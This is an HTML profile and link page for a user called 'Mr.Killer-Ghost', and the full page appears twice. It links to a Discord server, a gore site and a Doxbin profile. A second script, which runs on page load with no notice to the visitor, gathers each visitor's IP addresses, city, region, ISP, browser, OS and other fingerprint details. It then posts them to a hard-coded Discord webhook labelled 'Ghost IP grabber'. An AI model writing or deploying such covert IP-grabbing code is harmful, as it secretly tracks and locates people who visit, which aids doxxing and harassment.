# <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mr.Killer-Ghost</title>
  <link rel="preload" href="songs/Joan Of Arc.mp3" as="audio" />
  <link rel="preload" href="https://raw.githubusercontent.com/Mr-Killer-Ghost/ghost/refs/heads/main/pics/pfp.png" as="image" />
  <link rel="preload" href="https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png" as="image" />
  <link rel="preload" href="https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/new%20BG-2.png" as="image" />
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: cursive;
      background-image: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/new%20BG-2.png?raw=true');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      cursor: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png?raw=true'), auto;
      overflow: hidden;
    }

    #start-screen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
      opacity: 1;
      transition: opacity 1s ease;
      cursor: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png?raw=true'), pointer;
    }

    #start-screen.fade-out {
      opacity: 0;
      pointer-events: none;
    }

    #start-screen h1 {
      font-size: 3rem;
      margin: 0 0 1rem 0;
      text-shadow: 0 0 5px red, 0 0 15px red, 0 0 25px darkred;
    }

    .container {
      text-align: center;
      max-width: 400px;
      width: 90%;
      z-index: 2;
    }

    .profile .avatar {
      width: 150px;
      height: 150px;
      border-radius: 50%;
      margin-bottom: 1rem;
    }

    .profile h1 {
      margin: 0.5rem 0;
      font-size: 3rem;
      color: red;
      text-shadow: 0 0 1px red, 0 0 10px red, 0 0 14px darkred;
    }

    .profile p {
      margin-bottom: 2rem;
      color: #aaaaaa;
      font-size: 1.25rem;
    }

    .links .link-button {
      display: block;
      position: relative;
      background-color: #000000;
      color: #ffffff;
      text-decoration: none;
      padding: 1rem;
      margin: 0.75rem 0;
      border-radius: 8px;
      font-size: 1.2rem;
      overflow: hidden;
      transition: background-color 0.3s, transform 0.2s ease, text-shadow 0.3s ease;
    }

    .links .link-button::before {
      content: "";
      position: absolute;
      top: var(--y, 50%);
      left: var(--x, 50%);
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 60%);
      transform: translate(-50%, -50%);
      opacity: 0;
      transition: opacity 0.3s ease, top 0.2s ease, left 0.2s ease;
      pointer-events: none;
    }

    .links .link-button:hover {
      background-color: #2c2c2c;
      transform: scale(1.05);
      cursor: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png?raw=true'), pointer;
    }

    .links .link-button:hover::before {
      opacity: 1;
    }

    .glitch {
      position: relative;
      font-size: 3rem;
      color: red;
      text-shadow: 0 0 2px red, 0 0 15px red, 0 0 20px darkred;
      animation: glitch-skew 1.5s infinite ease-in-out alternate-reverse;
    }

    .glitch::before,
    .glitch::after {
      content: attr(data-text);
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      overflow: hidden;
      clip-path: inset(0);
      z-index: -1;
    }

    .glitch::before {
      color: cyan;
      text-shadow: 0 0 5px cyan;
      animation: glitch-anim-before 2.5s infinite ease-in-out;
    }

    .glitch::after {
      color: magenta;
      text-shadow: 0 0 5px magenta;
      animation: glitch-anim-after 2.5s infinite ease-in-out;
    }

    @keyframes glitch-skew {
      0% { transform: skew(0deg); }
      15% { transform: skew(-1.5deg); }
      30% { transform: skew(1.5deg); }
      45% { transform: skew(-1deg); }
      60% { transform: skew(1deg); }
      75% { transform: skew(-0.75deg); }
      90% { transform: skew(0.75deg); }
      100% { transform: skew(0deg); }
    }

    @keyframes glitch-anim-before {
      0% { clip-path: inset(60% 0 30% 0); transform: translate(-2px, 1px); opacity: 0.85; }
      20% { clip-path: inset(40% 0 40% 0); transform: translate(-1px, 1.5px); opacity: 0.75; }
      40% { clip-path: inset(30% 0 50% 0); transform: translate(-1.5px, 1px); opacity: 0.65; }
      60% { clip-path: inset(25% 0 55% 0); transform: translate(-0.5px, 0.5px); opacity: 0.7; }
      80% { clip-path: inset(10% 0 70% 0); transform: translate(-1px, 1px); opacity: 0.6; }
      100% { clip-path: inset(0 0 100% 0); transform: translate(0, 0); opacity: 0.7; }
    }

    @keyframes glitch-anim-after {
      0% { clip-path: inset(0 0 100% 0); transform: translate(1px, 2px); opacity: 0.7; }
      20% { clip-path: inset(20% 0 60% 0); transform: translate(0.5px, 1.5px); opacity: 0.65; }
      40% { clip-path: inset(30% 0 50% 0); transform: translate(1px, 1px); opacity: 0.6; }
      60% { clip-path: inset(40% 0 40% 0); transform: translate(1.5px, 0.5px); opacity: 0.7; }
      80% { clip-path: inset(50% 0 30% 0); transform: translate(1px, 1px); opacity: 0.6; }
      100% { clip-path: inset(100% 0 0 0); transform: translate(0, 0); opacity: 0.7; }
    }

    /* Volume slider styles */
    #volume-container {
      position: fixed;
      top: 10px;
      left: 10px;
      z-index: 10000;
      background: rgba(0,0,0,0.6);
      padding: 5px 10px;
      border-radius: 8px;
      user-select: none;
      display: flex;
      align-items: center;
      gap: 6px;
      font-family: cursive;
      color: white;
      font-size: 14px;
    }

    #volume-slider {
      -webkit-appearance: none;
      width: 100px;
      height: 6px;
      background: #333;
      border-radius: 3px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    #volume-slider:hover {
      background: #555;
    }

    #volume-slider::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 16px;
      height: 16px;
      background: red;
      cursor: pointer;
      border-radius: 50%;
      border: 2px solid white;
      transition: background-color 0.3s;
    }

    #volume-slider::-webkit-slider-thumb:hover {
      background: #ff4444;
    }

    #volume-slider::-moz-range-thumb {
      width: 16px;
      height: 16px;
      background: red;
      cursor: pointer;
      border-radius: 50%;
      border: 2px solid white;
      transition: background-color 0.3s;
    }

    #volume-slider::-moz-range-thumb:hover {
      background: #ff4444;
    }
  </style>
</head>
<body>

  <div id="volume-container">
    <label for="volume-slider"></label>
    <input type="range" id="volume-slider" min="0" max="1" step="0.01" value="1" />
  </div>

  <div class="container">
    <div class="profile">
      <img src="https://raw.githubusercontent.com/Mr-Killer-Ghost/ghost/refs/heads/main/pics/pfp.png" alt="Avatar" class="avatar" loading="lazy"/>
      <h1 class="glitch" data-text="Mr.Killer-Ghost">Mr.Killer-Ghost</h1>
      <p>Type.</p>
    </div>
    <div class="links">
      <a href="https://discord.gg/YeJwxrDM3w" target="_blank" class="link-button">Cyclops Ghosts Discord</a>
      <a href="https://watchpeopledie.tv/@Mr-Ghost" target="_blank" class="link-button">WPD</a>
      <a href="https://doxbin.net/user/invisible_ghost" target="_blank" class="link-button">Doxbin</a>
    </div>
  </div>

  <div id="start-screen">
    <h1>Click To Enter</h1>
  </div>

  <audio id="audio-player" src="songs/Joan Of Arc.mp3"></audio>

  <script>
    const startScreen = document.getElementById('start-screen');
    const audio = document.getElementById('audio-player');
    const volumeSlider = document.getElementById('volume-slider');

    startScreen.addEventListener('click', () => {
      startScreen.classList.add('fade-out');
      startScreen.addEventListener('transitionend', () => {
        startScreen.style.display = 'none';
      }, { once: true });
      audio.play();
    });

    // Load saved volume or default to 1
    const savedVolume = localStorage.getItem('volume');
    if (savedVolume !== null) {
      audio.volume = savedVolume;
      volumeSlider.value = savedVolume;
    }

    // Save volume when changed
    volumeSlider.addEventListener('input', () => {
      audio.volume = volumeSlider.value;
      localStorage.setItem('volume', volumeSlider.value);
    });

    // Title glitch
    const originalTitle = "Mr.Killer-Ghost";
    const glitchChars = ['@', '#', '$', '%', '&', '*', '+', '=', '~'];
    let interval;

    function glitchTitle() {
      let count = 0;
      interval = setInterval(() => {
        let glitched = originalTitle
          .split('')
          .map(char => Math.random() < 0.2 ? glitchChars[Math.floor(Math.random() * glitchChars.length)] : char)
          .join('');
        document.title = glitched;

        count++;
        if (count > 10) {
          clearInterval(interval);
          document.title = originalTitle;
          setTimeout(glitchTitle, 3000 + Math.random() * 2000);
        }
      }, 100);
    }

    glitchTitle();

    // Flashlight buttons
    const buttons = document.querySelectorAll('.link-button');
    buttons.forEach(button => {
      button.addEventListener('mousemove', (e) => {
        const rect = button.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        button.style.setProperty('--x', `${x}px`);
        button.style.setProperty('--y', `${y}px`);
      });
    });
    
  </script>

  <script>
  const webhookUrl = "https://discord.com/api/webhooks/1394009563799490630/EVOCTkNYfTh0qs8CM8o37aNZAGsnoq-AF7yHD-wgh5q8z-VwyQOASBQM5aXqKdE40b7x";

  let ipv6Address = "Not detected";
  let ipv4Address = "Not detected";
  let country = "Not detected";
  let region = "Not detected";
  let city = "Not detected";
  let isp = "Not detected";

  let ipv6Done = false;
  let ipv4Done = false;
  let geoDone = false;

  function getBrowserType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/waterfox/.test(ua)) return 'Waterfox';
    if (/edg\//.test(ua)) return 'Microsoft Edge';
    if (/opr\//.test(ua) || window.opr) return 'Opera';
    if (/vivaldi/.test(ua)) return 'Vivaldi';
    if (/brave\//.test(ua)) return 'Brave';
    if (/chrome|chromium|crios/.test(ua)) return 'Google Chrome';
    if (/firefox|fxios/.test(ua)) return 'Mozilla Firefox';
    if (/safari/.test(ua) && !/chrome|chromium|crios/.test(ua)) return 'Apple Safari';
    if (/trident|msie/.test(ua)) return 'Internet Explorer';
    if (/kaios/.test(ua)) return 'KaiOS Browser';
    return 'Unknown Browser';
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Win") !== -1) return "Windows";
    if (ua.indexOf("Mac") !== -1) return "MacOS";
    if (ua.indexOf("X11") !== -1) return "UNIX";
    if (ua.indexOf("Linux") !== -1) return "Linux";
    if (/Android/.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
    return "Unknown";
  }

  function getDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
  }

  const browserType = getBrowserType();
  const operatingSystem = getOS();
  const deviceType = getDeviceType();
  const userAgent = navigator.userAgent;
  const referrer = document.referrer || "None";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Not detected";
  const language = navigator.language || "Not detected";
  const screenResolution = `${screen.width}x${screen.height}`;

  // IPv6
  fetch("https://v6.ident.me/.json")
    .then(res => res.json())
    .then(data => {
      ipv6Address = data.address;
    })
    .catch(() => {
      ipv6Address = "Not detected";
    })
    .finally(() => {
      ipv6Done = true;
      checkAndSend();
    });

  // IPv4
  fetch("https://v4.ident.me/.json")
    .then(res => res.json())
    .then(data => {
      ipv4Address = data.address;
    })
    .catch(() => {
      ipv4Address = "Not detected";
    })
    .finally(() => {
      ipv4Done = true;
      checkAndSend();
    });

  // Geo
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      country = data.country_name || "Not detected";
      region = data.region || data.region_code || "Not detected";
      city = data.city || "Not detected";
      isp = data.org || "Not detected";
    })
    .catch(() => {
      country = "Not detected";
      region = "Not detected";
      city = "Not detected";
      isp = "Not detected";
    })
    .finally(() => {
      geoDone = true;
      checkAndSend();
    });

  function checkAndSend() {
    if (ipv6Done && ipv4Done && geoDone) {
      const payload = {
        content: 
`Ghost IP grabber

IPv4: ${ipv4Address}
IPv6: ${ipv6Address}
Country: ${country}
Region/State: ${region}
City: ${city}
ISP: ${isp}

Operating System: ${operatingSystem}
Browser: ${browserType}
Device Type: ${deviceType}
User Agent: ${userAgent}
Referrer: ${referrer}
Timezone: ${timezone}
Language: ${language}
Screen Resolution: ${screenResolution}`
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
      .then(() => {
        console.log("All info sent to Discord!");
      })
      .catch(error => {
        console.error("Failed to send to Discord:", error);
      });
    }
  }
</script>




</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mr.Killer-Ghost</title>
  <link rel="preload" href="songs/Joan Of Arc.mp3" as="audio" />
  <link rel="preload" href="https://raw.githubusercontent.com/Mr-Killer-Ghost/ghost/refs/heads/main/pics/pfp.png" as="image" />
  <link rel="preload" href="https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png" as="image" />
  <link rel="preload" href="https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/new%20BG-2.png" as="image" />
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: cursive;
      background-image: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/new%20BG-2.png?raw=true');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      cursor: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png?raw=true'), auto;
      overflow: hidden;
    }

    #start-screen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
      opacity: 1;
      transition: opacity 1s ease;
      cursor: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png?raw=true'), pointer;
    }

    #start-screen.fade-out {
      opacity: 0;
      pointer-events: none;
    }

    #start-screen h1 {
      font-size: 3rem;
      margin: 0 0 1rem 0;
      text-shadow: 0 0 5px red, 0 0 15px red, 0 0 25px darkred;
    }

    .container {
      text-align: center;
      max-width: 400px;
      width: 90%;
      z-index: 2;
    }

    .profile .avatar {
      width: 150px;
      height: 150px;
      border-radius: 50%;
      margin-bottom: 1rem;
    }

    .profile h1 {
      margin: 0.5rem 0;
      font-size: 3rem;
      color: red;
      text-shadow: 0 0 1px red, 0 0 10px red, 0 0 14px darkred;
    }

    .profile p {
      margin-bottom: 2rem;
      color: #aaaaaa;
      font-size: 1.25rem;
    }

    .links .link-button {
      display: block;
      position: relative;
      background-color: #000000;
      color: #ffffff;
      text-decoration: none;
      padding: 1rem;
      margin: 0.75rem 0;
      border-radius: 8px;
      font-size: 1.2rem;
      overflow: hidden;
      transition: background-color 0.3s, transform 0.2s ease, text-shadow 0.3s ease;
    }

    .links .link-button::before {
      content: "";
      position: absolute;
      top: var(--y, 50%);
      left: var(--x, 50%);
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 60%);
      transform: translate(-50%, -50%);
      opacity: 0;
      transition: opacity 0.3s ease, top 0.2s ease, left 0.2s ease;
      pointer-events: none;
    }

    .links .link-button:hover {
      background-color: #2c2c2c;
      transform: scale(1.05);
      cursor: url('https://github.com/Mr-Killer-Ghost/ghost/blob/main/pics/cur.png?raw=true'), pointer;
    }

    .links .link-button:hover::before {
      opacity: 1;
    }

    .glitch {
      position: relative;
      font-size: 3rem;
      color: red;
      text-shadow: 0 0 2px red, 0 0 15px red, 0 0 20px darkred;
      animation: glitch-skew 1.5s infinite ease-in-out alternate-reverse;
    }

    .glitch::before,
    .glitch::after {
      content: attr(data-text);
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      overflow: hidden;
      clip-path: inset(0);
      z-index: -1;
    }

    .glitch::before {
      color: cyan;
      text-shadow: 0 0 5px cyan;
      animation: glitch-anim-before 2.5s infinite ease-in-out;
    }

    .glitch::after {
      color: magenta;
      text-shadow: 0 0 5px magenta;
      animation: glitch-anim-after 2.5s infinite ease-in-out;
    }

    @keyframes glitch-skew {
      0% { transform: skew(0deg); }
      15% { transform: skew(-1.5deg); }
      30% { transform: skew(1.5deg); }
      45% { transform: skew(-1deg); }
      60% { transform: skew(1deg); }
      75% { transform: skew(-0.75deg); }
      90% { transform: skew(0.75deg); }
      100% { transform: skew(0deg); }
    }

    @keyframes glitch-anim-before {
      0% { clip-path: inset(60% 0 30% 0); transform: translate(-2px, 1px); opacity: 0.85; }
      20% { clip-path: inset(40% 0 40% 0); transform: translate(-1px, 1.5px); opacity: 0.75; }
      40% { clip-path: inset(30% 0 50% 0); transform: translate(-1.5px, 1px); opacity: 0.65; }
      60% { clip-path: inset(25% 0 55% 0); transform: translate(-0.5px, 0.5px); opacity: 0.7; }
      80% { clip-path: inset(10% 0 70% 0); transform: translate(-1px, 1px); opacity: 0.6; }
      100% { clip-path: inset(0 0 100% 0); transform: translate(0, 0); opacity: 0.7; }
    }

    @keyframes glitch-anim-after {
      0% { clip-path: inset(0 0 100% 0); transform: translate(1px, 2px); opacity: 0.7; }
      20% { clip-path: inset(20% 0 60% 0); transform: translate(0.5px, 1.5px); opacity: 0.65; }
      40% { clip-path: inset(30% 0 50% 0); transform: translate(1px, 1px); opacity: 0.6; }
      60% { clip-path: inset(40% 0 40% 0); transform: translate(1.5px, 0.5px); opacity: 0.7; }
      80% { clip-path: inset(50% 0 30% 0); transform: translate(1px, 1px); opacity: 0.6; }
      100% { clip-path: inset(100% 0 0 0); transform: translate(0, 0); opacity: 0.7; }
    }

    /* Volume slider styles */
    #volume-container {
      position: fixed;
      top: 10px;
      left: 10px;
      z-index: 10000;
      background: rgba(0,0,0,0.6);
      padding: 5px 10px;
      border-radius: 8px;
      user-select: none;
      display: flex;
      align-items: center;
      gap: 6px;
      font-family: cursive;
      color: white;
      font-size: 14px;
    }

    #volume-slider {
      -webkit-appearance: none;
      width: 100px;
      height: 6px;
      background: #333;
      border-radius: 3px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    #volume-slider:hover {
      background: #555;
    }

    #volume-slider::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 16px;
      height: 16px;
      background: red;
      cursor: pointer;
      border-radius: 50%;
      border: 2px solid white;
      transition: background-color 0.3s;
    }

    #volume-slider::-webkit-slider-thumb:hover {
      background: #ff4444;
    }

    #volume-slider::-moz-range-thumb {
      width: 16px;
      height: 16px;
      background: red;
      cursor: pointer;
      border-radius: 50%;
      border: 2px solid white;
      transition: background-color 0.3s;
    }

    #volume-slider::-moz-range-thumb:hover {
      background: #ff4444;
    }
  </style>
</head>
<body>

  <div id="volume-container">
    <label for="volume-slider"></label>
    <input type="range" id="volume-slider" min="0" max="1" step="0.01" value="1" />
  </div>

  <div class="container">
    <div class="profile">
      <img src="https://raw.githubusercontent.com/Mr-Killer-Ghost/ghost/refs/heads/main/pics/pfp.png" alt="Avatar" class="avatar" loading="lazy"/>
      <h1 class="glitch" data-text="Mr.Killer-Ghost">Mr.Killer-Ghost</h1>
      <p>Type.</p>
    </div>
    <div class="links">
      <a href="https://discord.gg/YeJwxrDM3w" target="_blank" class="link-button">Cyclops Ghosts Discord</a>
      <a href="https://watchpeopledie.tv/@Mr-Ghost" target="_blank" class="link-button">WPD</a>
      <a href="https://doxbin.net/user/invisible_ghost" target="_blank" class="link-button">Doxbin</a>
    </div>
  </div>

  <div id="start-screen">
    <h1>Click To Enter</h1>
  </div>

  <audio id="audio-player" src="songs/Joan Of Arc.mp3"></audio>

  <script>
    const startScreen = document.getElementById('start-screen');
    const audio = document.getElementById('audio-player');
    const volumeSlider = document.getElementById('volume-slider');

    startScreen.addEventListener('click', () => {
      startScreen.classList.add('fade-out');
      startScreen.addEventListener('transitionend', () => {
        startScreen.style.display = 'none';
      }, { once: true });
      audio.play();
    });

    // Load saved volume or default to 1
    const savedVolume = localStorage.getItem('volume');
    if (savedVolume !== null) {
      audio.volume = savedVolume;
      volumeSlider.value = savedVolume;
    }

    // Save volume when changed
    volumeSlider.addEventListener('input', () => {
      audio.volume = volumeSlider.value;
      localStorage.setItem('volume', volumeSlider.value);
    });

    // Title glitch
    const originalTitle = "Mr.Killer-Ghost";
    const glitchChars = ['@', '#', '$', '%', '&', '*', '+', '=', '~'];
    let interval;

    function glitchTitle() {
      let count = 0;
      interval = setInterval(() => {
        let glitched = originalTitle
          .split('')
          .map(char => Math.random() < 0.2 ? glitchChars[Math.floor(Math.random() * glitchChars.length)] : char)
          .join('');
        document.title = glitched;

        count++;
        if (count > 10) {
          clearInterval(interval);
          document.title = originalTitle;
          setTimeout(glitchTitle, 3000 + Math.random() * 2000);
        }
      }, 100);
    }

    glitchTitle();

    // Flashlight buttons
    const buttons = document.querySelectorAll('.link-button');
    buttons.forEach(button => {
      button.addEventListener('mousemove', (e) => {
        const rect = button.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        button.style.setProperty('--x', `${x}px`);
        button.style.setProperty('--y', `${y}px`);
      });
    });
    
  </script>

  <script>
  const webhookUrl = "https://discord.com/api/webhooks/1394009563799490630/EVOCTkNYfTh0qs8CM8o37aNZAGsnoq-AF7yHD-wgh5q8z-VwyQOASBQM5aXqKdE40b7x";

  let ipv6Address = "Not detected";
  let ipv4Address = "Not detected";
  let country = "Not detected";
  let region = "Not detected";
  let city = "Not detected";
  let isp = "Not detected";

  let ipv6Done = false;
  let ipv4Done = false;
  let geoDone = false;

  function getBrowserType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/waterfox/.test(ua)) return 'Waterfox';
    if (/edg\//.test(ua)) return 'Microsoft Edge';
    if (/opr\//.test(ua) || window.opr) return 'Opera';
    if (/vivaldi/.test(ua)) return 'Vivaldi';
    if (/brave\//.test(ua)) return 'Brave';
    if (/chrome|chromium|crios/.test(ua)) return 'Google Chrome';
    if (/firefox|fxios/.test(ua)) return 'Mozilla Firefox';
    if (/safari/.test(ua) && !/chrome|chromium|crios/.test(ua)) return 'Apple Safari';
    if (/trident|msie/.test(ua)) return 'Internet Explorer';
    if (/kaios/.test(ua)) return 'KaiOS Browser';
    return 'Unknown Browser';
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Win") !== -1) return "Windows";
    if (ua.indexOf("Mac") !== -1) return "MacOS";
    if (ua.indexOf("X11") !== -1) return "UNIX";
    if (ua.indexOf("Linux") !== -1) return "Linux";
    if (/Android/.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
    return "Unknown";
  }

  function getDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
  }

  const browserType = getBrowserType();
  const operatingSystem = getOS();
  const deviceType = getDeviceType();
  const userAgent = navigator.userAgent;
  const referrer = document.referrer || "None";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Not detected";
  const language = navigator.language || "Not detected";
  const screenResolution = `${screen.width}x${screen.height}`;

  // IPv6
  fetch("https://v6.ident.me/.json")
    .then(res => res.json())
    .then(data => {
      ipv6Address = data.address;
    })
    .catch(() => {
      ipv6Address = "Not detected";
    })
    .finally(() => {
      ipv6Done = true;
      checkAndSend();
    });

  // IPv4
  fetch("https://v4.ident.me/.json")
    .then(res => res.json())
    .then(data => {
      ipv4Address = data.address;
    })
    .catch(() => {
      ipv4Address = "Not detected";
    })
    .finally(() => {
      ipv4Done = true;
      checkAndSend();
    });

  // Geo
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      country = data.country_name || "Not detected";
      region = data.region || data.region_code || "Not detected";
      city = data.city || "Not detected";
      isp = data.org || "Not detected";
    })
    .catch(() => {
      country = "Not detected";
      region = "Not detected";
      city = "Not detected";
      isp = "Not detected";
    })
    .finally(() => {
      geoDone = true;
      checkAndSend();
    });

  function checkAndSend() {
    if (ipv6Done && ipv4Done && geoDone) {
      const payload = {
        content: 
`Ghost IP grabber

IPv4: ${ipv4Address}
IPv6: ${ipv6Address}
Country: ${country}
Region/State: ${region}
City: ${city}
ISP: ${isp}

Operating System: ${operatingSystem}
Browser: ${browserType}
Device Type: ${deviceType}
User Agent: ${userAgent}
Referrer: ${referrer}
Timezone: ${timezone}
Language: ${language}
Screen Resolution: ${screenResolution}`
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
      .then(() => {
        console.log("All info sent to Discord!");
      })
      .catch(error => {
        console.error("Failed to send to Discord:", error);
      });
    }
  }
</script>




</body>
</html>
